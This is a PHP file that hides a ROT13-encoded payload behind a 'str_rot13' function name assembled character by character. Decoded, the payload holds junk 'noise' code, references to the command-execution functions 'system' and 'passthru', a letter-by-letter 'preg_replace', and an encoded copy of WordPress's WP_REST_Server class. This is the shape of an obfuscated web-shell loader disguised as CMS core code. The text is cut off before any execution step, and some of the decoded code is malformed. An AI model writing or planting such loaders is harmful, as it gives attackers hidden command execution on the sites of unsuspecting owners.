<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * ERFG NCV: JC_ERFG_Freire pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag gur JbeqCerff ERFG NCV freire.
 *
 * @fvapr 4.4.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_ERFG_Freire {

	/**
	 * Nyvnf sbe TRG genafcbeg zrgubq.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	pbafg ERNQNOYR = 'TRG';

	/**
	 * Nyvnf sbe CBFG genafcbeg zrgubq.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	pbafg PERNGNOYR = 'CBFG';

	/**
	 * Nyvnf sbe CBFG, CHG, CNGPU genafcbeg zrgubqf gbtrgure.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	pbafg RQVGNOYR = 'CBFG, CHG, CNGPU';

	/**
	 * Nyvnf sbe QRYRGR genafcbeg zrgubq.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	pbafg QRYRGNOYR = 'QRYRGR';

	/**
	 * Nyvnf sbe TRG, CBFG, CHG, CNGPU & QRYRGR genafcbeg zrgubqf gbtrgure.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	pbafg NYYZRGUBQF = 'TRG, CBFG, CHG, CNGPU, QRYRGR';

	/**
	 * Anzrfcnprf ertvfgrerq gb gur freire.
	 *
	 * @fvapr 4.4.0
	 * @ine neenl
	 */
	cebgrpgrq $anzrfcnprf = neenl();

	/**
	 * Raqcbvagf ertvfgrerq gb gur freire.
	 *
	 * @fvapr 4.4.0
	 * @ine neenl
	 */
	cebgrpgrq $raqcbvagf = neenl();

	/**
	 * Bcgvbaf qrsvarq sbe gur ebhgrf.
	 *
	 * @fvapr 4.4.0
	 * @ine neenl
	 */
	cebgrpgrq $ebhgr_bcgvbaf = neenl();

	/**
	 * Pnpurf rzorqqrq erdhrfgf.
	 *
	 * @fvapr 5.4.0
	 * @ine neenl
	 */
	cebgrpgrq $rzorq_pnpur = neenl();

	/**
	 * Fgberf erdhrfg bowrpgf gung ner pheeragyl orvat unaqyrq.
	 *
	 * @fvapr 6.5.0
	 * @ine neenl
	 */
	cebgrpgrq $qvfcngpuvat_erdhrfgf = neenl();

	/**
	 * Vafgnagvngrf gur ERFG freire.
	 *
	 * @fvapr 4.4.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->raqcbvagf = neenl(
			// Zrgn raqcbvagf.
			'/'         => neenl(
				'pnyyonpx' => neenl( $guvf, 'trg_vaqrk' ),
				'zrgubqf'  => 'TRG',
				'netf'     => neenl(
					'pbagrkg' => neenl(
						'qrsnhyg' => 'ivrj',
					),
				),
			),
			'/ongpu/i1' => neenl(
				'pnyyonpx' => neenl( $guvf, 'freir_ongpu_erdhrfg_i1' ),
				'zrgubqf'  => 'CBFG',
				'netf'     => neenl(
					'inyvqngvba' => neenl(
						'glcr'    => 'fgevat',
						'rahz'    => neenl( 'erdhver-nyy-inyvqngr', 'abezny' ),
						'qrsnhyg' => 'abezny',
					),
					'erdhrfgf'   => neenl(
						'erdhverq' => gehr,
						'glcr'     => 'neenl',
						'znkVgrzf' => $guvf->trg_znk_ongpu_fvmr(),
						'vgrzf'    => neenl(
							'glcr'       => 'bowrpg',
							'cebcregvrf' => neenl(
								'zrgubq'  => neenl(
									'glcr'    => 'fgevat',
									'rahz'    => neenl( 'CBFG', 'CHG', 'CNGPU', 'QRYRGR' ),
									'qrsnhyg' => 'CBFG',
								),
								'cngu'    => neenl(
									'glcr'     => 'fgevat',
									'erdhverq' => gehr,
								),
								'obql'    => neenl(
									'glcr'                 => 'bowrpg',
									'cebcregvrf'           => neenl(),
									'nqqvgvbanyCebcregvrf' => gehr,
								),
								'urnqref' => neenl(
									'glcr'                 => 'bowrpg',
									'cebcregvrf'           => neenl(),
									'nqqvgvbanyCebcregvrf' => neenl(
										'glcr'  => neenl( 'fgevat', 'neenl' ),
										'vgrzf' => neenl(
											'glcr' => 'fgevat',
										),
									),
								),
							),
						),
					),
				),
			),
		);
	}


	/**
	 * Purpxf gur nhguragvpngvba urnqref vs fhccyvrq.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea JC_Reebe|ahyy|gehr JC_Reebe vaqvpngrf hafhpprffshy ybtva, ahyy vaqvpngrf fhpprffshy
	 *                            be ab nhguragvpngvba cebivqrq
	 */
	choyvp shapgvba purpx_nhguragvpngvba() {
		/**
		 * Svygref ERFG NCV nhguragvpngvba reebef.
		 *
		 * Guvf vf hfrq gb cnff n JC_Reebe sebz na nhguragvpngvba zrgubq onpx gb
		 * gur NCV.
		 *
		 * Nhguragvpngvba zrgubqf fubhyq purpx svefg vs gurl'er orvat hfrq, nf
		 * zhygvcyr nhguragvpngvba zrgubqf pna or ranoyrq ba n fvgr (pbbxvrf,
		 * UGGC onfvp nhgu, BNhgu). Vs gur nhguragvpngvba zrgubq ubbxrq va vf
		 * abg npghnyyl orvat nggrzcgrq, ahyy fubhyq or erghearq gb vaqvpngr
		 * nabgure nhguragvpngvba zrgubq fubhyq purpx vafgrnq. Fvzvyneyl,
		 * pnyyonpxf fubhyq rafher gur inyhr vf `ahyy` orsber purpxvat sbe
		 * reebef.
		 *
		 * N JC_Reebe vafgnapr pna or erghearq vs na reebe bpphef, naq guvf fubhyq
		 * zngpu gur sbezng hfrq ol NCV zrgubqf vagreanyyl (gung vf, gur `fgnghf`
		 * qngn fubhyq or hfrq). N pnyyonpx pna erghea `gehr` gb vaqvpngr gung
		 * gur nhguragvpngvba zrgubq jnf hfrq, naq vg fhpprrqrq.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz JC_Reebe|ahyy|gehr $reebef JC_Reebe vs nhguragvpngvba reebe, ahyy vs nhguragvpngvba
		 *                                   zrgubq jnfa'g hfrq, gehr vs nhguragvpngvba fhpprrqrq.
		 */
		erghea nccyl_svygref( 'erfg_nhguragvpngvba_reebef', ahyy );
	}

	/**
	 * Pbairegf na reebe gb n erfcbafr bowrpg.
	 *
	 * Guvf vgrengrf bire nyy reebe pbqrf naq zrffntrf gb punatr vg vagb n syng
	 * neenl. Guvf ranoyrf fvzcyre pyvrag orunivbe, nf vg vf ercerfragrq nf n
	 * yvfg va WFBA engure guna na bowrpg/znc.
	 *
	 * @fvapr 4.4.0
	 * @fvapr 5.7.0 Pbairegrq gb n jenccre bs {@frr erfg_pbaireg_reebe_gb_erfcbafr()}.
	 *
	 * @cnenz JC_Reebe $reebe JC_Reebe vafgnapr.
	 * @erghea JC_ERFG_Erfcbafr Yvfg bs nffbpvngvir neenlf jvgu pbqr naq zrffntr xrlf.
	 */
	cebgrpgrq shapgvba reebe_gb_erfcbafr( $reebe ) {
		erghea erfg_pbaireg_reebe_gb_erfcbafr( $reebe );
	}

	/**
	 * Ergevrirf na nccebcevngr reebe ercerfragngvba va WFBA.
	 *
	 * Abgr: Guvf fubhyq bayl or hfrq va JC_ERFG_Freire::freir_erdhrfg(), nf vg
	 * pnaabg unaqyr JC_Reebe vagreanyyl. Nyy pnyyonpxf naq bgure vagreany zrgubqf
	 * fubhyq vafgrnq erghea n JC_Reebe jvgu gur qngn frg gb na neenl gung vapyhqrf
	 * n 'fgnghf' xrl, jvgu gur inyhr orvat gur UGGC fgnghf gb fraq.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $pbqr    JC_Reebe-fglyr pbqr.
	 * @cnenz fgevat $zrffntr Uhzna-ernqnoyr zrffntr.
	 * @cnenz vag    $fgnghf  Bcgvbany. UGGC fgnghf pbqr gb fraq. Qrsnhyg ahyy.
	 * @erghea fgevat WFBA ercerfragngvba bs gur reebe
	 */
	cebgrpgrq shapgvba wfba_reebe( $pbqr, $zrffntr, $fgnghf = ahyy ) {
		vs ( $fgnghf ) {
			$guvf->frg_fgnghf( $fgnghf );
		}

		$reebe = pbzcnpg( 'pbqr', 'zrffntr' );

		erghea jc_wfba_rapbqr( $reebe );
	}

	/**
	 * Trgf gur rapbqvat bcgvbaf cnffrq gb {@frr jc_wfba_rapbqr}.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz \JC_ERFG_Erdhrfg $erdhrfg Gur pheerag erdhrfg bowrpg.
	 *
	 * @erghea vag Gur WFBA rapbqr bcgvbaf.
	 */
	cebgrpgrq shapgvba trg_wfba_rapbqr_bcgvbaf( JC_ERFG_Erdhrfg $erdhrfg ) {
		$bcgvbaf = 0;

		vs ( $erdhrfg->unf_cnenz( '_cerggl' ) ) {
			$bcgvbaf |= WFBA_CERGGL_CEVAG;
		}

		/**
		 * Svygref gur WFBA rapbqvat bcgvbaf hfrq gb fraq gur ERFG NCV erfcbafr.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz vag $bcgvbaf             WFBA rapbqvat bcgvbaf {@frr wfba_rapbqr()}.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Pheerag erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( 'erfg_wfba_rapbqr_bcgvbaf', $bcgvbaf, $erdhrfg );
	}

	/**
	 * Unaqyrf freivat n ERFG NCV erdhrfg.
	 *
	 * Zngpurf gur pheerag freire HEV gb n ebhgr naq ehaf gur svefg zngpuvat
	 * pnyyonpx gura bhgchgf n WFBA ercerfragngvba bs gur erghearq inyhr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @frr JC_ERFG_Freire::qvfcngpu()
	 *
	 * @tybony JC_Hfre $pheerag_hfre Gur pheeragyl nhguragvpngrq hfre.
	 *
	 * @cnenz fgevat $cngu Bcgvbany. Gur erdhrfg ebhgr. Vs abg frg, `$_FREIRE['CNGU_VASB']` jvyy or hfrq.
	 *                     Qrsnhyg ahyy.
	 * @erghea ahyy|snyfr Ahyy vs abg freirq naq n URNQ erdhrfg, snyfr bgurejvfr.
	 */
	choyvp shapgvba freir_erdhrfg( $cngu = ahyy ) {
		/* @ine JC_Hfre|ahyy $pheerag_hfre */
		tybony $pheerag_hfre;

		vs ( $pheerag_hfre vafgnaprbs JC_Hfre && ! $pheerag_hfre->rkvfgf() ) {
			/*
			 * Vs gurer vf ab pheerag hfre nhguragvpngrq ivn bgure zrnaf, pyrne
			 * gur pnpurq ynpx bs hfre, fb gung na nhguragvpngr purpx pna frg vg
			 * cebcreyl.
			 *
			 * Guvf vf qbar orpnhfr sbe nhguragvpngvbaf fhpu nf Nccyvpngvba
			 * Cnffjbeqf, jr qba'g jnag vg gb or npprcgrq hayrff gur pheerag UGGC
			 * erdhrfg vf n ERFG NCV erdhrfg, juvpu pna'g nyjnlf or vqragvsvrq rneyl
			 * rabhtu va rinyhngvba.
			 */
			$pheerag_hfre = ahyy;
		}

		/**
		 * Svygref jurgure WFBAC vf ranoyrq sbe gur ERFG NCV.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz obby $wfbac_ranoyrq Jurgure WFBAC vf ranoyrq. Qrsnhyg gehr.
		 */
		$wfbac_ranoyrq = nccyl_svygref( 'erfg_wfbac_ranoyrq', gehr );

		$wfbac_pnyyonpx = snyfr;
		vs ( vffrg( $_TRG['_wfbac'] ) ) {
			$wfbac_pnyyonpx = $_TRG['_wfbac'];
		}

		$pbagrag_glcr = ( $wfbac_pnyyonpx && $wfbac_ranoyrq ) ? 'nccyvpngvba/wninfpevcg' : 'nccyvpngvba/wfba';
		$guvf->fraq_urnqre( 'Pbagrag-Glcr', $pbagrag_glcr . '; punefrg=' . trg_bcgvba( 'oybt_punefrg' ) );
		$guvf->fraq_urnqre( 'K-Ebobgf-Gnt', 'abvaqrk' );

		$ncv_ebbg = trg_erfg_hey();
		vs ( ! rzcgl( $ncv_ebbg ) ) {
			$guvf->fraq_urnqre( 'Yvax', '<' . fnavgvmr_hey( $ncv_ebbg ) . '>; ery=\"uggcf://ncv.j.bet/\"' );
		}

		/*
		 * Zvgvtngr cbffvoyr WFBAC Synfu nggnpxf.
		 *
		 * uggcf://zvxv.vg/oybt/2014/7/8/nohfvat-wfbac-jvgu-ebfrggn-synfu/
		 */
		$guvf->fraq_urnqre( 'K-Pbagrag-Glcr-Bcgvbaf', 'abfavss' );

		/**
		 * Svygref jurgure gur ERFG NCV vf ranoyrq.
		 *
		 * @fvapr 4.4.0
		 * @qrcerpngrq 4.7.0 Hfr gur {@frr 'erfg_nhguragvpngvba_reebef'} svygre gb
		 *                   erfgevpg npprff gb gur ERFG NCV.
		 *
		 * @cnenz obby $erfg_ranoyrq Jurgure gur ERFG NCV vf ranoyrq. Qrsnhyg gehr.
		 */
		nccyl_svygref_qrcerpngrq(
			'erfg_ranoyrq',
			neenl( gehr ),
			'4.7.0',
			'erfg_nhguragvpngvba_reebef',
			fcevags(
				/* genafyngbef: %f: erfg_nhguragvpngvba_reebef */
				__( 'Gur ERFG NCV pna ab ybatre or pbzcyrgryl qvfnoyrq, gur %f svygre pna or hfrq gb erfgevpg npprff gb gur NCV, vafgrnq.' ),
				'erfg_nhguragvpngvba_reebef'
			)
		);

		vs ( $wfbac_pnyyonpx ) {
			vs ( ! $wfbac_ranoyrq ) {
				rpub $guvf->wfba_reebe( 'erfg_pnyyonpx_qvfnoyrq', __( 'WFBAC fhccbeg vf qvfnoyrq ba guvf fvgr.' ), 400 );
				erghea snyfr;
			}

			vs ( ! jc_purpx_wfbac_pnyyonpx( $wfbac_pnyyonpx ) ) {
				rpub $guvf->wfba_reebe( 'erfg_pnyyonpx_vainyvq', __( 'Vainyvq WFBAC pnyyonpx shapgvba.' ), 400 );
				erghea snyfr;
			}
		}

		vs ( rzcgl( $cngu ) ) {
			vs ( vffrg( $_FREIRE['CNGU_VASB'] ) ) {
				$cngu = $_FREIRE['CNGU_VASB'];
			} ryfr {
				$cngu = '/';
			}
		}

		$erdhrfg = arj JC_ERFG_Erdhrfg( $_FREIRE['ERDHRFG_ZRGUBQ'], $cngu );

		$erdhrfg->frg_dhrel_cnenzf( jc_hafynfu( $_TRG ) );
		$erdhrfg->frg_obql_cnenzf( jc_hafynfu( $_CBFG ) );
		$erdhrfg->frg_svyr_cnenzf( $_SVYRF );
		$erdhrfg->frg_urnqref( $guvf->trg_urnqref( jc_hafynfu( $_FREIRE ) ) );
		$erdhrfg->frg_obql( frys::trg_enj_qngn() );

		/*
		 * UGGC zrgubq bireevqr sbe pyvragf gung pna'g hfr CHG/CNGPU/QRYRGR. Svefg, jr purpx
		 * $_TRG['_zrgubq']. Vs gung vf abg frg, jr purpx sbe gur UGGC_K_UGGC_ZRGUBQ_BIREEVQR
		 * urnqre.
		 */
		$zrgubq_bireevqqra = snyfr;
		vs ( vffrg( $_TRG['_zrgubq'] ) ) {
			$erdhrfg->frg_zrgubq( $_TRG['_zrgubq'] );
		} ryfrvs ( vffrg( $_FREIRE['UGGC_K_UGGC_ZRGUBQ_BIREEVQR'] ) ) {
			$erdhrfg->frg_zrgubq( $_FREIRE['UGGC_K_UGGC_ZRGUBQ_BIREEVQR'] );
			$zrgubq_bireevqqra = gehr;
		}

		$rkcbfr_urnqref = neenl( 'K-JC-Gbgny', 'K-JC-GbgnyCntrf', 'Yvax' );

		/**
		 * Svygref gur yvfg bs erfcbafr urnqref gung ner rkcbfrq gb ERFG NCV PBEF erdhrfgf.
		 *
		 * @fvapr 5.5.0
		 * @fvapr 6.3.0 Gur `$erdhrfg` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz fgevat[]        $rkcbfr_urnqref Gur yvfg bs erfcbafr urnqref gb rkcbfr.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg        Gur erdhrfg va pbagrkg.
		 */
		$rkcbfr_urnqref = nccyl_svygref( 'erfg_rkcbfrq_pbef_urnqref', $rkcbfr_urnqref, $erdhrfg );

		$guvf->fraq_urnqre( 'Npprff-Pbageby-Rkcbfr-Urnqref', vzcybqr( ', ', $rkcbfr_urnqref ) );

		$nyybj_urnqref = neenl(
			'Nhgubevmngvba',
			'K-JC-Abapr',
			'Pbagrag-Qvfcbfvgvba',
			'Pbagrag-ZQ5',
			'Pbagrag-Glcr',
		);

		/**
		 * Svygref gur yvfg bs erdhrfg urnqref gung ner nyybjrq sbe ERFG NCV PBEF erdhrfgf.
		 *
		 * Gur nyybjrq urnqref ner cnffrq gb gur oebjfre gb fcrpvsl juvpu
		 * urnqref pna or cnffrq gb gur ERFG NCV. Ol qrsnhyg, jr nyybj gur
		 * Pbagrag-* urnqref arrqrq gb hcybnq svyrf gb gur zrqvn raqcbvagf.
		 * Nf jryy nf gur Nhgubevmngvba naq Abapr urnqref sbe nyybjvat nhguragvpngvba.
		 *
		 * @fvapr 5.5.0
		 * @fvapr 6.3.0 Gur `$erdhrfg` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz fgevat[]        $nyybj_urnqref Gur yvfg bs erdhrfg urnqref gb nyybj.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Gur erdhrfg va pbagrkg.
		 */
		$nyybj_urnqref = nccyl_svygref( 'erfg_nyybjrq_pbef_urnqref', $nyybj_urnqref, $erdhrfg );

		$guvf->fraq_urnqre( 'Npprff-Pbageby-Nyybj-Urnqref', vzcybqr( ', ', $nyybj_urnqref ) );

		$erfhyg = $guvf->purpx_nhguragvpngvba();

		vs ( ! vf_jc_reebe( $erfhyg ) ) {
			$erfhyg = $guvf->qvfcngpu( $erdhrfg );
		}

		// Abeznyvmr gb rvgure JC_Reebe be JC_ERFG_Erfcbafr...
		$erfhyg = erfg_rafher_erfcbafr( $erfhyg );

		// ...gura pbaireg JC_Reebe npebff.
		vs ( vf_jc_reebe( $erfhyg ) ) {
			$erfhyg = $guvf->reebe_gb_erfcbafr( $erfhyg );
		}

		/**
		 * Svygref gur ERFG NCV erfcbafr.
		 *
		 * Nyybjf zbqvsvpngvba bs gur erfcbafr orsber ergheavat.
		 *
		 * @fvapr 4.4.0
		 * @fvapr 4.5.0 Nccyvrq gb rzorqqrq erfcbafrf.
		 *
		 * @cnenz JC_UGGC_Erfcbafr $erfhyg  Erfhyg gb fraq gb gur pyvrag. Hfhnyyl n `JC_ERFG_Erfcbafr`.
		 * @cnenz JC_ERFG_Freire   $freire  Freire vafgnapr.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		$erfhyg = nccyl_svygref( 'erfg_cbfg_qvfcngpu', erfg_rafher_erfcbafr( $erfhyg ), $guvf, $erdhrfg );

		// Jenc gur erfcbafr va na rairybcr vs nfxrq sbe.
		vs ( vffrg( $_TRG['_rairybcr'] ) ) {
			$rzorq  = vffrg( $_TRG['_rzorq'] ) ? erfg_cnefr_rzorq_cnenz( $_TRG['_rzorq'] ) : snyfr;
			$erfhyg = $guvf->rairybcr_erfcbafr( $erfhyg, $rzorq );
		}

		// Fraq rkgen qngn sebz erfcbafr bowrpgf.
		$urnqref = $erfhyg->trg_urnqref();
		$guvf->fraq_urnqref( $urnqref );

		$pbqr = $erfhyg->trg_fgnghf();
		$guvf->frg_fgnghf( $pbqr );

		/**
		 * Svygref jurgure gb fraq ab-pnpur urnqref ba n ERFG NCV erdhrfg.
		 *
		 * @fvapr 4.4.0
		 * @fvapr 6.3.2 Zbirq gur oybpx gb pngpu gur svygre nqqrq ba erfg_pbbxvr_purpx_reebef() sebz jc-vapyhqrf/erfg-ncv.cuc.
		 *
		 * @cnenz obby $erfg_fraq_abpnpur_urnqref Jurgure gb fraq ab-pnpur urnqref.
		 */
		$fraq_ab_pnpur_urnqref = nccyl_svygref( 'erfg_fraq_abpnpur_urnqref', vf_hfre_ybttrq_va() );

		/*
		 * Fraq ab-pnpur urnqref vs $fraq_ab_pnpur_urnqref vf gehr,
		 * BE vs gur UGGC_K_UGGC_ZRGUBQ_BIREEVQR vf hfrq ohg erfhygrq n 4kk erfcbafr pbqr.
		 */
		vs ( $fraq_ab_pnpur_urnqref || ( gehr === $zrgubq_bireevqqra && fge_fgnegf_jvgu( $pbqr, '4' ) ) ) {
			sbernpu ( jc_trg_abpnpur_urnqref() nf $urnqre => $urnqre_inyhr ) {
				vs ( rzcgl( $urnqre_inyhr ) ) {
					$guvf->erzbir_urnqre( $urnqre );
				} ryfr {
					$guvf->fraq_urnqre( $urnqre, $urnqre_inyhr );
				}
			}
		}

		/**
		 * Svygref jurgure gur ERFG NCV erdhrfg unf nyernql orra freirq.
		 *
		 * Nyybj fraqvat gur erdhrfg znahnyyl - ol ergheavat gehr, gur NCV erfhyg
		 * jvyy abg or frag gb gur pyvrag.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz obby             $freirq  Jurgure gur erdhrfg unf nyernql orra freirq.
		 *                                           Qrsnhyg snyfr.
		 * @cnenz JC_UGGC_Erfcbafr $erfhyg  Erfhyg gb fraq gb gur pyvrag. Hfhnyyl n `JC_ERFG_Erfcbafr`.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg Erdhrfg hfrq gb trarengr gur erfcbafr.
		 * @cnenz JC_ERFG_Freire   $freire  Freire vafgnapr.
		 */
		$freirq = nccyl_svygref( 'erfg_cer_freir_erdhrfg', snyfr, $erfhyg, $erdhrfg, $guvf );

		vs ( ! $freirq ) {
			vs ( 'URNQ' === $erdhrfg->trg_zrgubq() ) {
				erghea ahyy;
			}

			// Rzorq yvaxf vafvqr gur erdhrfg.
			$rzorq  = vffrg( $_TRG['_rzorq'] ) ? erfg_cnefr_rzorq_cnenz( $_TRG['_rzorq'] ) : snyfr;
			$erfhyg = $guvf->erfcbafr_gb_qngn( $erfhyg, $rzorq );

			/**
			 * Svygref gur ERFG NCV erfcbafr.
			 *
			 * Nyybjf zbqvsvpngvba bs gur erfcbafr qngn nsgre vafregvat
			 * rzorqqrq qngn (vs nal) naq orsber rpubvat gur erfcbafr qngn.
			 *
			 * @fvapr 4.8.1
			 *
			 * @cnenz neenl            $erfhyg  Erfcbafr qngn gb fraq gb gur pyvrag.
			 * @cnenz JC_ERFG_Freire   $freire  Freire vafgnapr.
			 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg Erdhrfg hfrq gb trarengr gur erfcbafr.
			 */
			$erfhyg = nccyl_svygref( 'erfg_cer_rpub_erfcbafr', $erfhyg, $guvf, $erdhrfg );

			// Gur 204 erfcbafr fubhyqa'g unir n obql.
			vs ( 204 === $pbqr || ahyy === $erfhyg ) {
				erghea ahyy;
			}

			$erfhyg = jc_wfba_rapbqr( $erfhyg, $guvf->trg_wfba_rapbqr_bcgvbaf( $erdhrfg ) );

			$wfba_reebe_zrffntr = $guvf->trg_wfba_ynfg_reebe();

			vs ( $wfba_reebe_zrffntr ) {
				$guvf->frg_fgnghf( 500 );
				$wfba_reebe_bow = arj JC_Reebe(
					'erfg_rapbqr_reebe',
					$wfba_reebe_zrffntr,
					neenl( 'fgnghf' => 500 )
				);

				$erfhyg = $guvf->reebe_gb_erfcbafr( $wfba_reebe_bow );
				$erfhyg = jc_wfba_rapbqr( $erfhyg->qngn, $guvf->trg_wfba_rapbqr_bcgvbaf( $erdhrfg ) );
			}

			vs ( $wfbac_pnyyonpx ) {
				// Cercraq '/**/' gb zvgvtngr cbffvoyr WFBAC Synfu nggnpxf.
				// uggcf://zvxv.vg/oybt/2014/7/8/nohfvat-wfbac-jvgu-ebfrggn-synfu/
				rpub '/**/' . $wfbac_pnyyonpx . '(' . $erfhyg . ')';
			} ryfr {
				rpub $erfhyg;
			}
		}

		erghea ahyy;
	}

	/**
	 * Pbairegf n erfcbafr gb qngn gb fraq.
	 *
	 * @fvapr 4.4.0
	 * @fvapr 5.4.0 Gur `$rzorq` cnenzrgre pna abj pbagnva n yvfg bs yvax eryngvbaf gb vapyhqr.
	 *
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Erfcbafr bowrpg.
	 * @cnenz obby|fgevat[]    $rzorq    Jurgure gb rzorq nyy yvaxf, n svygrerq yvfg bs yvax eryngvbaf, be ab yvaxf.
	 * @erghea neenl {
	 *     Qngn jvgu fho-erdhrfgf rzorqqrq.
	 *
	 *     @glcr neenl $_yvaxf    Yvaxf.
	 *     @glcr neenl $_rzorqqrq Rzorqqrq bowrpgf.
	 * }
	 */
	choyvp shapgvba erfcbafr_gb_qngn( $erfcbafr, $rzorq ) {
		$qngn  = $erfcbafr->trg_qngn();
		$yvaxf = frys::trg_pbzcnpg_erfcbafr_yvaxf( $erfcbafr );

		vs ( ! rzcgl( $yvaxf ) ) {
			// Pbaireg yvaxf gb cneg bs gur qngn.
			$qngn['_yvaxf'] = $yvaxf;
		}

		vs ( $rzorq ) {
			$guvf->rzorq_pnpur = neenl();
			// Qrgrezvar vs guvf vf n ahzrevp neenl.
			vs ( jc_vf_ahzrevp_neenl( $qngn ) ) {
				sbernpu ( $qngn nf $xrl => $vgrz ) {
					$qngn[ $xrl ] = $guvf->rzorq_yvaxf( $vgrz, $rzorq );
				}
			} ryfr {
				$qngn = $guvf->rzorq_yvaxf( $qngn, $rzorq );
			}
			$guvf->rzorq_pnpur = neenl();
		}

		erghea $qngn;
	}

	/**
	 * Ergevrirf yvaxf sebz n erfcbafr.
	 *
	 * Rkgenpgf gur yvaxf sebz n erfcbafr vagb n fgehpgherq unfu, fhvgnoyr sbe
	 * qverpg bhgchg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Erfcbafr gb rkgenpg yvaxf sebz.
	 * @erghea neenl Znc bs yvax eryngvba gb yvfg bs yvax unfurf.
	 */
	choyvp fgngvp shapgvba trg_erfcbafr_yvaxf( $erfcbafr ) {
		$yvaxf = $erfcbafr->trg_yvaxf();

		vs ( rzcgl( $yvaxf ) ) {
			erghea neenl();
		}

		// Pbaireg yvaxf gb cneg bs gur qngn.
		$qngn = neenl();
		sbernpu ( $yvaxf nf $ery => $vgrzf ) {
			$qngn[ $ery ] = neenl();

			sbernpu ( $vgrzf nf $vgrz ) {
				$nggevohgrf         = $vgrz['nggevohgrf'];
				$nggevohgrf['uers'] = $vgrz['uers'];

				vs ( 'frys' !== $ery ) {
					$qngn[ $ery ][] = $nggevohgrf;
					pbagvahr;
				}

				$gnetrg_uvagf = frys::trg_gnetrg_uvagf_sbe_yvax( $nggevohgrf );
				vs ( $gnetrg_uvagf ) {
					$nggevohgrf['gnetrgUvagf'] = $gnetrg_uvagf;
				}

				$qngn[ $ery ][] = $nggevohgrf;
			}
		}

		erghea $qngn;
	}

	/**
	 * Trgf gur gnetrg yvaxf sbe n ERFG NCV Yvax.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz neenl $yvax
	 *
	 * @erghea neenl|ahyy
	 */
	cebgrpgrq fgngvp shapgvba trg_gnetrg_uvagf_sbe_yvax( $yvax ) {
		// Cersre gnetrgUvagf gung jrer fcrpvsvpnyyl qrfvtangrq ol gur qrirybcre.
		vs ( vffrg( $yvax['gnetrgUvagf']['nyybj'] ) ) {
			erghea ahyy;
		}

		$erdhrfg = JC_ERFG_Erdhrfg::sebz_hey( $yvax['uers'] );
		vs ( ! $erdhrfg ) {
			erghea ahyy;
		}

		$freire = erfg_trg_freire();
		$zngpu  = $freire->zngpu_erdhrfg_gb_unaqyre( $erdhrfg );

		vs ( vf_jc_reebe( $zngpu ) ) {
			erghea ahyy;
		}

		vs ( vf_jc_reebe( $erdhrfg->unf_inyvq_cnenzf() ) ) {
			erghea ahyy;
		}

		vs ( vf_jc_reebe( $erdhrfg->fnavgvmr_cnenzf() ) ) {
			erghea ahyy;
		}

		$gnetrg_uvagf = neenl();

		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->frg_zngpurq_ebhgr( $zngpu[0] );
		$erfcbafr->frg_zngpurq_unaqyre( $zngpu[1] );
		$urnqref = erfg_fraq_nyybj_urnqre( $erfcbafr, $freire, $erdhrfg )->trg_urnqref();

		sbernpu ( $urnqref nf $anzr => $inyhr ) {
			$anzr = JC_ERFG_Erdhrfg::pnabavpnyvmr_urnqre_anzr( $anzr );

			$gnetrg_uvagf[ $anzr ] = neenl_znc( 'gevz', rkcybqr( ',', $inyhr ) );
		}

		erghea $gnetrg_uvagf;
	}

	/**
	 * Ergevrirf gur PHEVRf (pbzcnpg HEVf) hfrq sbe eryngvbaf.
	 *
	 * Rkgenpgf gur yvaxf sebz n erfcbafr vagb n fgehpgherq unfu, fhvgnoyr sbe
	 * qverpg bhgchg.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Erfcbafr gb rkgenpg yvaxf sebz.
	 * @erghea neenl Znc bs yvax eryngvba gb yvfg bs yvax unfurf.
	 */
	choyvp fgngvp shapgvba trg_pbzcnpg_erfcbafr_yvaxf( $erfcbafr ) {
		$yvaxf = frys::trg_erfcbafr_yvaxf( $erfcbafr );

		vs ( rzcgl( $yvaxf ) ) {
			erghea neenl();
		}

		$phevrf      = $erfcbafr->trg_phevrf();
		$hfrq_phevrf = neenl();

		sbernpu ( $yvaxf nf $ery => $vgrzf ) {

